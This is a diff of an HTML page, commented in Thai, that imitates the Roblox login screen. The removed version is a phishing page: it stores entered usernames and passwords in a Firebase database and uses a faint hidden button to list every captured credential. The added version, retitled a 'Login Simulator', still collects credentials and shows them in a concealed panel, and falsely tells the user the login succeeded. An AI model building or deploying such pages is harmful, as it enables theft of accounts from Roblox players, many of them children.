@@ -1,150 +1,153 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ลงชื่อเข้าใช้ Roblox</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Login Simulator</title>
+<style>
+  /* Reset พื้นฐาน */
+  * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif;}
+  body { background-color:#f2f2f2; display:flex; justify-content:center; align-items:center; height:100vh; }
 
-  <!-- CSS -->
-  <style>
-    * { box-sizing: border-box; }
-    body { margin:0; padding:0; font-family: 'Segoe UI', sans-serif; background-color: #1c1c1c; color: white; }
+  /* กล่องล็อกอิน */
+  .login-container {
+    background-color:#fff;
+    padding:40px;
+    border-radius:10px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.15);
+    width:350px;
+    text-align:center;
+    position:relative;
+  }
 
-    header { background-color: #000; display:flex; justify-content: space-between; align-items:center; padding:8px 16px; }
-    .logo { display:flex; align-items:center; }
-    .logo svg { width:32px; height:32px; }
-    .header-buttons { display:flex; align-items:center; gap:10px; }
-    .btn-primary { background-color:#007bff; color:white; border:none; padding:6px 16px; border-radius:4px; font-weight:bold; cursor:pointer; }
-    .btn-outline { background-color:#333; color:white; border:none; padding:6px 16px; border-radius:4px; font-weight:bold; cursor:pointer; }
-    .search-icon { background-color:transparent; border:none; color:white; font-size:20px; cursor:pointer; }
+  /* โลโก้จำลอง Roblox */
+  .logo {
+    font-size:36px;
+    font-weight:bold;
+    color:#e2231a;
+    margin-bottom:30px;
+    letter-spacing:2px;
+  }
 
-    nav { background-color:#111; display:flex; justify-content:center; gap:30px; padding:10px 0; font-size:15px; }
+  input[type="text"], input[type="password"] {
+    width:100%;
+    padding:12px;
+    margin-bottom:15px;
+    border-radius:5px;
+    border:1px solid #ccc;
+    font-size:16px;
+  }
 
-    .container { max-width:400px; margin:40px auto; background-color:#2a2a2a; padding:20px; border-radius:10px; text-align:center; }
-    .container h2 { margin-bottom:20px; }
-    input[type="text"], input[type="password"] { width:90%; padding:10px; margin:10px auto; display:block; border:none; border-radius:5px; font-size:16px; }
-    button.login { background-color:#444; padding:10px 20px; color:white; border:none; border-radius:5px; font-size:16px; margin-top:10px; cursor:pointer; }
-    .link-button { background-color:#333; color:white; border:none; padding:10px; margin:10px auto; width:90%; display:block; border-radius:5px; cursor:pointer; }
+  button {
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:5px;
+    background-color:#e2231a;
+    color:#fff;
+    font-size:16px;
+    cursor:pointer;
+    transition:0.3s;
+  }
 
-    footer { margin-top:50px; font-size:13px; color:#aaa; display:flex; flex-wrap:wrap; justify-content:center; gap:15px; padding:20px 10px; }
-    a { color:#aaa; text-decoration:none; }
+  button:hover {
+    background-color:#bf1a15;
+  }
 
-    #secret-btn { position: fixed; bottom:8px; right:10px; background-color:transparent; border:none; font-size:10px; opacity:0.3; cursor:pointer; }
-    #secret-box { position: fixed; bottom:50px; right:10px; background-color:#111; padding:10px; border-radius:5px; font-size:13px; display:none; z-index:999; color:white; max-width:80%; word-break: break-all; }
-  </style>
+  /* ปุ่มลับ */
+  .secret-btn {
+    position:absolute;
+    bottom:10px;
+    right:10px;
+    width:30px;
+    height:30px;
+    background-color:#e2231a;
+    border:none;
+    border-radius:50%;
+    cursor:pointer;
+  }
 
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
-  <script>
-    const firebaseConfig = {
-      apiKey: "API_KEY",
-      authDomain: "PROJECT_ID.firebaseapp.com",
-      databaseURL: "https://PROJECT_ID.firebaseio.com",
-      projectId: "PROJECT_ID",
-      storageBucket: "PROJECT_ID.appspot.com",
-      messagingSenderId: "SENDER_ID",
-      appId: "APP_ID"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-  </script>
+  .secret-panel {
+    position:fixed;
+    top:10%;
+    left:50%;
+    transform:translateX(-50%);
+    background:#fff;
+    border:2px solid #e2231a;
+    padding:20px;
+    width:400px;
+    max-height:70%;
+    overflow:auto;
+    display:none;
+    z-index:100;
+  }
 
+  .close-btn {
+    float:right;
+    cursor:pointer;
+    font-weight:bold;
+    color:#e2231a;
+  }
+
+  .secret-panel h3 {
+    margin-bottom:15px;
+  }
+
+  .login-info {
+    text-align:left;
+    font-family:monospace;
+    white-space:pre-wrap;
+  }
+</style>
 </head>
 <body>
 
-  <!-- Header -->
-  <header>
-    <div class="logo">
-      <!-- โลโก้ Roblox แบบเหมือนจริงมากขึ้น -->
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256" fill="white">
-        <path d="M49.4 0L0 49.4v157.2L206.6 413 256 363.6 49.4 0zm133.8 148.3l-67.2-14.7 14.7-67.2 67.2 14.7-14.7 67.2z"/>
-      </svg>
-    </div>
-    <div class="header-buttons">
-      <button class="btn-primary">ลงทะเบียน</button>
-      <button class="btn-outline">ลงชื่อเข้าใช้</button>
-      <button class="search-icon" title="ค้นหา">🔍</button>
-    </div>
-  </header>
+<div class="login-container">
+  <div class="logo">ROBLOX</div>
+  <input type="text" id="username" placeholder="Username">
+  <input type="text" id="password" placeholder="Password">
+  <button onclick="login()">Log In</button>
 
-  <!-- Navigation -->
-  <nav>
-    <div>อันดับ</div>
-    <div>มาร์เก็ตเพลส</div>
-    <div>สร้างสรรค์</div>
-    <div>Robux</div>
-  </nav>
+  <button class="secret-btn" onclick="toggleSecretPanel()"></button>
+</div>
 
-  <!-- Login box -->
-  <div class="container">
-    <h2>ลงชื่อเข้าใช้ Roblox</h2>
-    <input type="text" id="username" placeholder="ชื่อผู้ใช้/อีเมล/หมายเลขโทรศัพท์">
-    <input type="password" id="password" placeholder="รหัสผ่าน">
-    <button class="login" onclick="login()">ลงชื่อเข้าใช้</button>
+<div class="secret-panel" id="secretPanel">
+  <span class="close-btn" onclick="toggleSecretPanel()">X</span>
+  <h3>ข้อมูลผู้ใช้ที่กรอก</h3>
+  <div class="login-info" id="loginInfo"></div>
+</div>
 
-    <div style="margin-top: 15px;">ลืมรหัสผ่านหรือชื่อผู้ใช้ใช่ไหม?</div>
-    <button class="link-button">ส่งรหัสแบบใช้ครั้งเดียวให้ฉันทางอีเมล</button>
-    <button class="link-button">ใช้อุปกรณ์อื่น</button>
+<script>
+  // เก็บข้อมูลผู้ใช้กรอก
+  let userData = [];
 
-    <div style="margin-top: 15px;">ยังไม่มีบัญชีใช่ไหม? <a href="#">ลงทะเบียน</a></div>
-  </div>
-
-  <!-- Footer -->
-  <footer>
-    <a href="#">เกี่ยวกับเรา</a>
-    <a href="#">งาน</a>
-    <a href="#">บล็อก</a>
-    <a href="#">ผู้ปกครอง</a>
-    <a href="#">บัตรของขวัญ</a>
-    <a href="#">ความช่วยเหลือ</a>
-    <a href="#">ข้อกำหนด</a>
-    <a href="#">การช่วยเหลือการเข้าถึง</a>
-    <a href="#">ความเป็นส่วนตัว</a>
-    <a href="#">ตัวเลือกสำหรับความเป็นส่วนตัวของคุณ</a>
-  </footer>
-
-  <!-- Secret button -->
-  <button id="secret-btn" onclick="toggleSecret()">.</button>
-  <div id="secret-box"></div>
-
-  <!-- Script -->
-  <script>
-    function login() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      if (username && password) {
-        // บันทึกลง Firebase
-        db.ref('users/' + Date.now()).set({
-          username: username,
-          password: password
-        }).then(() => {
-          alert('เข้าสู่ระบบสำเร็จและซิงก์กับทุกเครื่อง');
-        });
-      } else {
-        alert('กรุณากรอกข้อมูลให้ครบ');
-      }
+  function login() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    if(username && password){
+      userData.push({username,password});
+      alert('เข้าสู่ระบบสำเร็จ (จำลอง)');
+      document.getElementById('username').value = '';
+      document.getElementById('password').value = '';
+      updateSecretPanel();
+    } else {
+      alert('กรุณากรอกทั้งชื่อผู้ใช้และรหัส');
     }
+  }
 
-    // ปุ่มลับ
-    function toggleSecret() {
-      const box = document.getElementById("secret-box");
-      if (box.style.display === "block") {
-        box.style.display = "none";
-      } else {
-        db.ref('users').once('value', snapshot => {
-          let data = snapshot.val();
-          let output = '';
-          for (let key in data) {
-            output += `ชื่อผู้ใช้: ${data[key].username}\nรหัสผ่าน: ${data[key].password}\n\n`;
-          }
-          box.innerText = output || '(ไม่มีข้อมูล)';
-          box.style.display = 'block';
-        });
-      }
-    }
-  </script>
+  function toggleSecretPanel() {
+    const panel = document.getElementById('secretPanel');
+    panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+  }
+
+  function updateSecretPanel() {
+    const infoDiv = document.getElementById('loginInfo');
+    infoDiv.innerHTML = '';
+    userData.forEach((u,i)=>{
+      infoDiv.innerHTML += `${i+1}. Username: ${u.username} | Password: ${u.password}\n`;
+    });
+  }
+</script>
 
 </body>
-      </html>
+</html>
